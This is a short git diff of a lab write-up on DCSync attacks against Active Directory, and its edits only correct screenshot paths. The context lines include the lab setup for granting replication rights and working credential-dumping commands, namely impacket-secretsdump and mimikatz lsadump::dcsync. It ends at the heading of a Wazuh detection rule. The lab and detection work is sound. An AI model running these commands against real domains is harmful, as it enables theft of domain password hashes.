@@ -3,7 +3,7 @@ DCSync abuses the "Directory Replication Service (DRS)" protocol. Domain Control
 ***Lab Setup***
 
 GUI:`Win + r -> dsa.msc` Create a new user, Enable Advanced Features `View -> Tick Advanced Features` `Right-Click FQDN -> Properties -> Security -> Advanced -> Add -> Select a Principal` Enter Desired User ![Description](Screenshots/dsa.msc.png)
-![Description](Adding%20Replication%20Rights%20GUI.png)
+![Description](Screenshots/Adding%20Replication%20Rights%20GUI.png)
 
 CLI: Run Powershell as administrator.
 
@@ -26,7 +26,7 @@ From Linux: `impacket-secretsdump redteam.local/dcreplicate:"Password123"@$IP`
 
 From Windows: `.\mimikatz.exe`
 `lsadump::dcsync /domain redteam.local /user:$USER$`
-![Description](Windows%20powershell%20mimikatz.png)
+![Description](Screenshots/Windows%20powershell%20mimikatz.png)
 
 Detection: Custom Wazuh Rule
 ```xml
